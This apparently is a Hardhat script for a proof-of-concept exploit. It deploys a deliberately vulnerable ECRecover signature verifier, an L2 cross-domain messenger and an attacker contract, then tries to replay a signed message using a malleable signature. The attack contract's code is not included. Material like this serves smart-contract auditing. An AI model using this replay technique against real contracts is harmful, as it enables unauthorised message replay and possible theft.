import { ethers } from "hardhat";

async function main() {
  console.log("Starting ECRecover Signature Malleability Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy vulnerable signature verifier
  const VulnerableSignatureVerifier = await ethers.getContractFactory("VulnerableSignatureVerifier");
  const verifier = await VulnerableSignatureVerifier.deploy();
  await verifier.deployed();
  console.log(`VulnerableSignatureVerifier deployed at: ${verifier.address}`);
  
  // Deploy messenger that uses the verifier
  const L2CrossDomainMessenger = await ethers.getContractFactory("L2CrossDomainMessengerWithECRecover");
  const messenger = await L2CrossDomainMessenger.deploy(verifier.address);
  await messenger.deployed();
  console.log(`L2CrossDomainMessengerWithECRecover deployed at: ${messenger.address}`);
  
  // Deploy attacker contract
  const SignatureReplayAttacker = await ethers.getContractFactory("SignatureReplayAttacker");
  const attacker = await SignatureReplayAttacker.deploy();
  await attacker.deployed();
  console.log(`SignatureReplayAttacker deployed at: ${attacker.address}`);
  
  // Setup accounts
  const [owner, user] = await ethers.getSigners();
  console.log(`Using signer account: ${owner.address}`);
  console.log(`Using user account: ${user.address}`);
  
  // Create a message to be sent cross-domain
  const target = ethers.constants.AddressZero; // Dummy target address
  const message = ethers.utils.solidityPack(["string"], ["Hello, Optimism!"]);
  
  // Create a messageHash as defined in the contract
  const messageHash = ethers.utils.keccak256(
    ethers.utils.solidityPack(
      ["address", "address", "bytes"],
      [target, owner.address, message]
    )
  );
  console.log(`Generated message hash: ${messageHash}`);
  
  // Sign the message
  const signature = await owner.signMessage(ethers.utils.arrayify(messageHash));
  console.log(`Original signature created: ${signature}`);
  
  // Send the original message
  console.log("\nSending original message with valid signature...");
  await messenger.connect(owner).sendCrossDomainMessage(target, message, signature);
  console.log("Original message accepted and processed");
  
  // Now perform the signature malleability attack
  console.log("\nPerforming signature malleability attack...");
  try {
    await attacker.performAttack(messenger.address, target, message, signature);
    console.log("⚠️ Attack succeeded: replayed the same message with a malleable signature!");
    console.log("\n✅ VULNERABILITY CONFIRMED: ECRecover signature malleability allows message replay");
  } catch (error) {
    console.log("❌ Attack failed: The contract might be protected against signature malleability");
    console.error(error);
  }
  
  console.log("\nExploit demonstration complete.");
}

// Ensure this can be called directly as well as imported
if (require.main === module) {
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

export default main;